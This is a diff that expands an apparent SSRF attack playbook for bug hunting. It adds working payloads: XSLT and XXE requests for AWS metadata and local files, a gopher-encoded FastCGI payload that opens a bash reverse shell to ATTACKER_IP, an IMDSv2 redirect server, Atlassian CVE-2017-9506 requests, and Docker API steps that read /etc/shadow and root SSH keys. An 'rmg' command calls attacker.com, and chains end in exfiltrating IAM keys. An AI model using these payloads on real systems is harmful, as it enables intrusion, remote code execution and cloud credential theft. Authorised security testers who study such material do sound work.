@@ -543,9 +543,313 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
 
 ---
 
+## XSLT Processors → SSRF via document()
+
+**Root cause:** XSLT processors execute the `document()` function to load external XML resources at transform time. If user-supplied stylesheets are accepted, this function makes an outbound HTTP request from the server — bypassing any URL-parameter-level filter entirely because the SSRF payload is inside the XML body, not a URL parameter.
+
+**Bypass logic:** Embed `document('http://internal-target/')` inside an XSL template. The server's XSLT engine resolves it; input-URL allowlists do not apply. `file://` also works for local file read.
+
+**Attack chain:** SSRF → internal metadata endpoint → IAM credential theft / internal service probe
+
+**Stack:** Java (Xalan, Saxon), Python (lxml), PHP (XSLTProcessor), Ruby (Nokogiri), .NET (XslCompiledTransform)
+
+**Payload:**
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+    <!-- SSRF: AWS IMDS -->
+    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+    <!-- SSRF: internal admin panel -->
+    <xsl:copy-of select="document('http://192.168.1.1:8080/admin')"/>
+    <!-- Local file read -->
+    <xsl:copy-of select="document('file:///etc/passwd')"/>
+    <xsl:for-each select="fruit">
+      <xsl:value-of select="name"/>
+    </xsl:for-each>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+**Where to test:** Document transformations, report generators, data import/export features, SOAP endpoints that accept XSLT, any feature that renders XML with a user-supplied stylesheet.
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection
+
+---
+
+## XXE → SSRF via External Entities
+
+**Root cause:** XML parsers with DTD processing enabled resolve `SYSTEM` external entity URLs, causing the server to fetch them. The SSRF originates inside an XML body or uploaded file — entirely bypassing URL-parameter filters.
+
+**Bypass logic:** Supply a `SYSTEM` entity referencing an internal URL. The XML parser makes the HTTP request before the application code sees the parsed result. Blind variants use parameter entities to trigger OOB callbacks.
+
+**Attack chain:** XML body / file upload SSRF → internal service probe / IMDS → cloud credential theft
+
+**Stack:** Any XML parser with external entity resolution: libxml2, Xerces, MSXML, Java XML, PHP SimpleXML/DOMDocument
+
+**Payloads:**
+```xml
+<!-- Basic XXE → SSRF: fetches internal service -->
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/" >
+]>
+<foo>&xxe;</foo>
+
+<!-- Blind XXE → SSRF: OOB DNS/HTTP callback only -->
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+  <!ENTITY % ext SYSTEM "http://YOUR-OOB-ID.oast.fun/ssrf-xxe"> %ext;
+]>
+<r></r>
+
+<!-- SVG upload → SSRF (SVG is XML; triggers on image render) -->
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="20">&xxe;</text>
+</svg>
+```
+
+**Attack surfaces:** REST APIs accepting `Content-Type: application/xml`, SAML assertions, RSS/Atom feed importers, DOCX/XLSX/ODT upload, SVG upload with server-side rendering.
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+
+---
+
+## FastCGI via Gopher → PHP RCE
+
+**Root cause:** PHP-FPM listens on port 9000 by default and accepts `PHP_VALUE` directives in FastCGI requests. By injecting `auto_prepend_file = php://input`, the attacker causes PHP to execute arbitrary code from the request body before running any legitimate script.
+
+**Bypass logic:** `gopher://` sends raw FastCGI protocol bytes. The payload sets `SCRIPT_FILENAME` to an existing PHP file on disk and overrides `php.ini` to enable URL includes and prepend attacker code from `php://input`.
+
+**Attack chain:** SSRF → gopher → FastCGI port 9000 → PHP `auto_prepend_file` injection → OS command execution → reverse shell
+
+**Stack:** PHP-FPM (default nginx+PHP-FPM deployments), any internal service running php-fpm
+
+**Payload:**
+```
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29%3Bdie%28%27done%27%29%3B%3F%3E%00%00%00%00%00%00%00
+```
+
+Tool: `gopherus --exploit fastcgi` (auto-generates the payload)
+
+**Source:** https://github.com/assetnote/blind-ssrf-chains
+
+---
+
+## HTTP 307/308 Redirect → IMDSv2 PUT Bypass
+
+**Root cause:** HTTP 307 (Temporary Redirect) and 308 (Permanent Redirect) instruct the HTTP client to re-send the **original request method and body** to the redirect target. Standard 301/302 redirects downgrade POST/PUT to GET; 307/308 do not. IMDSv2 requires a PUT request to obtain a token — which most SSRF mitigations block by only allowing GET-based fetches.
+
+**Bypass logic:**
+1. Point the SSRF to attacker-controlled server
+2. Attacker server responds `HTTP/1.1 307` → `Location: http://169.254.169.254/latest/api/token`
+3. The vulnerable app re-sends the original PUT (with `X-aws-ec2-metadata-token-ttl-seconds: 21600`) to the IMDS
+4. IMDS returns a valid token; app returns it in response
+5. Use token to query IMDSv2 credentials endpoint
+
+**Attack chain:** SSRF (any GET-based parameter) → 307 redirect → IMDSv2 PUT → session token → IAM credentials → AWS account pivot
+
+**Stack:** AWS EC2 with IMDSv2 enforcement; any HTTP client/library that follows 307 redirects (most do by spec)
+
+**Redirect server (Python one-liner):**
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class R(BaseHTTPRequestHandler):
+    def do_GET(self): self._redir()
+    def do_PUT(self): self._redir()
+    def _redir(self):
+        self.send_response(307)
+        self.send_header('Location', 'http://169.254.169.254/latest/api/token')
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 80), R).serve_forever()
+```
+
+**Source:** https://github.com/assetnote/blind-ssrf-chains
+
+---
+
+## Atlassian Products OAuth SSRF — CVE-2017-9506
+
+**Root cause:** The Atlassian OAuth plugin exposes `/plugins/servlet/oauth/users/icon-uri?consumerUri=<URL>`, which fetches the consumer's icon from the supplied URL without authentication and without input validation. The response body is returned to the caller.
+
+**Bypass logic:** Supply an internal URL as `consumerUri`. The Atlassian server makes the request and proxies the response — a full read-SSRF with response body returned.
+
+**Attack chain:** SSRF → cloud metadata / internal APIs → credential theft; or → internal service exploitation
+
+**Stack:** Jira (<7.3.5), Confluence, Bamboo, Bitbucket, Crowd, Crucible, Fisheye — any Atlassian product running the OAuth plugin (pre-2017 unpatched instances are extremely common on internal networks)
+
+**Payloads:**
+```
+# CVE-2017-9506 — all Atlassian products with OAuth plugin (unauthenticated)
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Probe for role name first, then:
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+
+# Jira CVE-2019-8451 (<8.4.0) — gadgets endpoint SSRF
+GET /plugins/servlet/gadgets/makeRequest?url=https://169.254.169.254@example.com
+
+# Confluence share-links endpoint (pre-Nov 2016)
+GET /rest/sharelinks/1.0/link?url=http://YOUR-OOB-ID.oast.fun/
+```
+
+**Note:** One of the most widely found SSRF CVEs on internal pentests. Atlassian products are near-universal in enterprise environments.
+
+**Source:** https://github.com/assetnote/blind-ssrf-chains; CVE-2017-9506
+
+---
+
+## Docker API (Port 2375) → SSRF → RCE
+
+**Root cause:** Docker daemon running unauthenticated (`dockerd -H tcp://0.0.0.0:2375`) exposes a REST API that can create containers, bind-mount the host filesystem, and execute commands inside containers with host-level access.
+
+**Bypass logic:** Via SSRF HTTP GET to `/containers/json` first confirms exposure. Then POST `/containers/create` with `"Binds": ["/:/mnt"]` and `"Privileged": true` mounts the host root inside the container — giving full filesystem access. Gopher can send the raw HTTP POST for blind SSRF scenarios.
+
+**Attack chain:** SSRF → Docker API → create privileged container with host bind-mount → read `/mnt/etc/shadow`, `/mnt/root/.ssh/id_rsa` → write cron job to host → OS RCE
+
+**Stack:** Linux hosts running Docker with unauthenticated TCP listener (common in dev/CI environments)
+
+**Payloads:**
+```bash
+# Step 1: Confirm exposure
+http://127.0.0.1:2375/version
+http://127.0.0.1:2375/containers/json
+
+# Step 2: Create privileged container (POST via SSRF)
+POST http://127.0.0.1:2375/containers/create?name=pwned
+Content-Type: application/json
+{
+  "Image": "alpine",
+  "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"],
+  "Binds": ["/:/mnt"],
+  "Privileged": true
+}
+
+# Step 3: Start container
+POST http://127.0.0.1:2375/containers/pwned/start
+
+# Step 4: Read output / exec more commands
+POST http://127.0.0.1:2375/containers/pwned/exec
+{"AttachStdout": true, "Cmd": ["cat", "/mnt/root/.ssh/id_rsa"]}
+```
+
+**Source:** https://github.com/assetnote/blind-ssrf-chains
+
+---
+
+## Java RMI via Gopher → Deserialization RCE
+
+**Root cause:** Java RMI (Remote Method Invocation) services deserialize incoming Java objects. If a gadget chain (e.g., Commons Collections) is available on the classpath, sending a malicious serialized payload causes RCE.
+
+**Bypass logic:** `gopher://` encodes raw TCP bytes; the RMI deserialization happens before any authentication check. The tool `remote-method-guesser` generates the gopher-encoded payload automatically.
+
+**Attack chain:** SSRF → gopher → RMI port → Java deserialization → OS command execution
+
+**Stack:** Legacy Java enterprise apps, JMX servers, EJB servers, any Java service exposing RMI
+
+**Payload generation:**
+```bash
+# Tool: remote-method-guesser (rmg)
+rmg serial 127.0.0.1 1099 CommonsCollections6 'curl attacker.com/rce' \
+    --component reg --ssrf --gopher
+# Outputs: gopher://127.0.0.1:1099/_<encoded-deserialization-payload>
+```
+
+**Ports to probe:** 1090, 1098, 1099, 1199, 4443-4446, 8999-9010, 9999
+
+**Source:** https://github.com/assetnote/blind-ssrf-chains
+
+---
+
+## Service-Specific Blind SSRF Exploitation — Internal Target Reference
+
+When blind SSRF is confirmed, use this table to identify exploitable internal services by port. Detect open ports via timing (open = slower or different error), then escalate with the listed payload.
+
+| Service | Default Port | Detection | Impact | Protocol |
+|---------|-------------|-----------|--------|----------|
+| WebLogic UDDI (CVE-2014-4210) | 7001, 8888 | `GET /uddiexplorer/SearchPublicRegistries.jsp?operator=OOB_CANARY` | SSRF confirmation + RCE chain | HTTP |
+| WebLogic Console (CVE-2020-14883) | 7001 | `POST /console/css/%252e%252e%252fconsole.portal` with `handle=FileSystemXmlApplicationContext(URL)` | RCE via Spring XML factory | HTTP |
+| Consul | 8500, 8501 | `GET /v1/agent/members` | Service registration → command execution | HTTP |
+| Apache Solr | 8983 | `GET /solr/admin/info/system` | XXE chain (`/solr/select?q={!xmlparser...}`) → SSRF / RCE | HTTP |
+| Apache Druid | 8080, 8888 | `GET /status` | Task/supervisor shutdown; RCE via task submit | HTTP |
+| OpenTSDB | 4242 | `GET /version` | Command injection via gnuplot query params (CVE-2020-35476) | HTTP |
+| Hystrix Dashboard (CVE-2020-5412) | 8080 | `GET /proxy.stream?origin=OOB_CANARY` | SSRF amplifier in Spring Cloud Netflix | HTTP |
+| JBoss | 8080, 8443 | `GET /jmx-console/` | WAR deployment → RCE | HTTP |
+| Apache Struts (Struts2-016) | 80, 8080 | `?redirect:${...}` in any param | OGNL injection → OS RCE | HTTP |
+| PeopleSoft | 80, 443 | `POST /PSIGW/HttpListeningConnector` with XML body | XXE → code execution | HTTP |
+| GitLab Prometheus/Redis | 9121 | `GET /scrape?target=redis://127.0.0.1:6379&check-keys=*` | Dump all Redis keys (GitLab <13.1.1) | HTTP |
+| Shellshock via CGI | 80, 443 | `User-Agent: () { foo;}; curl OOB_CANARY` in SSRF request headers | Bash code execution via CGI | HTTP |
+| W3 Total Cache (CVE-2019-6715) | 80, 443 | `PUT /wp-content/plugins/w3-total-cache/pub/sns.php` with `{"SubscribeURL":"OOB_CANARY"}` | SSRF via WordPress plugin SNS endpoint | HTTP |
+| Docker API | 2375, 2376 | `GET /version` | Container creation → host RCE | HTTP |
+| FastCGI | 9000 | TCP connect timing | PHP code execution via PHP_VALUE injection | Gopher |
+| Redis | 6379 | `dict://127.0.0.1:6379/info` | RCE via cron / SSH key (see gopher chain above) | Gopher |
+| Memcached | 11211 | TCP connect timing | Cache poisoning / session injection → auth bypass | Gopher |
+| Java RMI | 1099 | TCP connect timing | Deserialization → RCE | Gopher |
+
+---
+
+## Malformed Port String Bypass
+
+Some URL parsers accept malformed port strings and the downstream connector strips invalid characters, connecting to the intended port — while the validator saw something different:
+
+```
+# Port with prefix/suffix chars — strips to valid port number
+http://localhost:+11211aaa/     # Some parsers strip non-numeric suffix → port 11211 (Memcached)
+http://localhost:00011211aaaa/  # Leading zeros + suffix stripped → port 11211
+
+# Backslash confusion (parser A reads host, parser B reads path)
+http://127.1.1.1:80\@127.2.2.2:80/
+
+# Colon-scheme confusion (no scheme, bare colon)
+http:127.0.0.1/
+```
+
+**Why it works:** Split-brain URL parsing — the validation layer misparses the port component but the HTTP connector normalizes and connects to the unintended target.
+
+**Stack:** PHP with different HTTP libraries, Ruby Net::HTTP, Python urllib vs. requests, nginx proxy_pass with upstream directive parsing.
+
+**Source:** https://github.com/KathanP19/HowToHunt/blob/master/SSRF/SSRF.md
+
+---
+
+## Static DNS Resolution Services for Allowlist Bypass
+
+Unlike DNS rebinding (which races the TTL), these services resolve deterministically to any encoded IP — useful when the filter checks DNS resolution at validation time rather than just the hostname string:
+
+```
+# nip.io — encodes the target IP in the subdomain (always resolves to that IP)
+http://127.0.0.1.nip.io/admin
+http://169.254.169.254.nip.io/
+http://10.0.0.1.nip.io/internal
+
+# sslip.io — same concept, TLS support
+http://127.0.0.1.sslip.io/
+http://169-254-169-254.sslip.io/
+
+# localtest.me — always resolves to 127.0.0.1
+http://localtest.me/admin
+http://localtest.me:8080/actuator
+
+# 1u.ms — DNS rebinding + static hybrid; also resolves to any encoded IP
+http://make-127.0.0.1-rr.1u.ms/
+http://make-169.254.169.254-rr.1u.ms/metadata
+```
+
+**When to use:** Allowlist filters that check if the domain *looks* external but don't block based on resolved IP. Also useful to bypass filters that only block literal `127.0.0.1` or `localhost` strings.
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Update each session.
+> Current patterns as of 2026-05-22. Updated this session.
 
 **What's being exploited in the wild:**
 
@@ -566,9 +870,30 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
    webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
    webhook + IMDSv1 = critical AWS credential theft.
 
-5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
+5. **gopher:// increasingly blocked** — WAFs and server-side allowlists now commonly
    block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
    to reach internal services via `http://`.
+
+6. **IMDSv2 bypass via HTTP 307 redirect** — IMDSv2 enforcement is being bypassed at
+   scale using 307 redirects that preserve the PUT method. Any SSRF that follows
+   redirects can hit IMDSv2, even with GET-only parameter filters.
+
+7. **XSLT and XML parsers — underrated vector** — SSRF via `document()` in XSLT and
+   XXE external entities bypasses all URL-parameter-level filters. Document import,
+   SOAP endpoints, SAML flows, and SVG upload are high-priority test points.
+
+8. **FastCGI as RCE escalation path** — When internal port scanning reveals port 9000
+   open, FastCGI via gopher is now a reliable RCE chain on any PHP-FPM deployment.
+   More reliable than Redis (which often has auth now) for fresh RCE.
+
+9. **Atlassian CVE-2017-9506 remains common on internal networks** — Despite being
+   disclosed in 2017, unpatched Jira/Confluence instances are everywhere in enterprise
+   environments. This is a reliable SSRF-with-response-body vector when found internally.
+
+10. **Service-specific exploitation over generic SSRF** — Blind SSRF confirmed via OOB
+    callback is now just step 1. The real bounty is in knowing which internal services
+    (Docker API, Consul, WebLogic, Solr) are exploitable and what payload to send.
+    Generic SSRF reports are triaged as informational; SSRF + RCE chain = critical.
 
 ---
 
@@ -579,14 +904,17 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
 | Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
 | Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
 | Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
-| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
+| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on allowlisted domain | URL parser confusion |
 | Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
 | Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
 | PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
 | Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
 | TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
 | DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
-| IMDSv2 required | gopher:// with PUT headers or redirect chain | Multi-step token fetch |
+| IMDSv2 required | HTTP 307 redirect preserving PUT method | Re-sends PUT to IMDS from app |
+| String-based host allowlist | `127.0.0.1.nip.io` or `localtest.me` | Static DNS resolution bypass |
+| URL validates on domain only | XSLT `document()` or XXE entity in XML body | Bypasses URL-param filter entirely |
+| Port filter (numeric check) | `localhost:+11211aaa` or `localhost:00011211` | Malformed port string normalization |
 
 ---
 
@@ -599,11 +927,17 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
 | Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
 | OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
 | Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
-| XML parsers with `xs:import` or XSLT | URL fetched during parsing | Blind SSRF from file processing |
+| XML parsers with `xs:import`, XSLT `document()`, XXE | URL fetched during parsing | SSRF bypassing URL-parameter filters |
+| SAML assertions with external entities | XML parser resolves DTD externals | XXE → SSRF to internal services |
+| SVG upload with server-side rendering | SVG is XML; external entities trigger fetches | Blind SSRF via file upload |
 | Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
 | Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
+| FastCGI at `127.0.0.1:9000` | PHP-FPM default; accepts PHP_VALUE injection | gopher → PHP RCE |
+| Docker API at `127.0.0.1:2375` | Unauthenticated daemon in dev/CI environments | Container create → host FS RCE |
 | Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
 | ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
+| Atlassian Jira/Confluence (CVE-2017-9506) | OAuth icon-uri endpoint — no auth needed | Full read-SSRF with response body |
+| Java RMI ports (1099, 8999-9010) | Deserialization without auth | gopher → RCE via gadget chains |
 
 ---
 
@@ -684,4 +1018,47 @@ Impact: Critical — RCE via internal Jenkins
 5. Pivot to a different AWS account in the organization
 
 Impact: Critical — cross-account AWS access
+```
+
+### Chain 6: XSLT Document Import → SSRF → Cloud Metadata
+
+```
+1. Find a feature accepting XSL stylesheets (report builder, data transformer, SOAP endpoint)
+2. Craft XSLT with document() fetching IMDS:
+   <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+3. Upload/submit stylesheet — server's XSLT engine fetches the URL during transform
+4. Response contains IAM role name → second request for credentials
+5. Exfil AccessKeyId + SecretAccessKey + SessionToken
+
+Impact: Critical — URL-parameter filters completely bypassed; SSRF via XML body
+```
+
+### Chain 7: SSRF → FastCGI Gopher → PHP RCE
+
+```
+1. Confirm SSRF in any parameter (blind is fine — gopher:// gets no response anyway)
+2. Probe port 9000: gopher://127.0.0.1:9000/ — timing difference confirms PHP-FPM
+3. Generate FastCGI payload via Gopherus:
+   python3 gopherus.py --exploit fastcgi
+   → enter existing PHP file path (e.g., /var/www/html/index.php)
+   → enter reverse shell command
+4. Send gopher:// payload via SSRF parameter
+5. PHP-FPM executes: auto_prepend_file = php://input → bash reverse shell
+
+Impact: Critical — RCE via internal PHP-FPM; works even without Redis/no-auth services
+```
+
+### Chain 8: Internal Jira CVE-2017-9506 → SSRF → IMDS Credential Theft
+
+```
+1. During recon, find internal Jira instance (common in enterprise environments)
+2. Test CVE-2017-9506 (no auth required):
+   GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+3. Response body contains IAM role name → fetch full credentials:
+   GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+4. Get AccessKeyId + SecretAccessKey + SessionToken
+5. Pivot to AWS: aws s3 ls, aws secretsmanager list-secrets
+
+Impact: Critical — unauthenticated SSRF via internal enterprise tooling
+Note: Works even when the SSRF target has no direct user-facing SSRF parameter
 ```
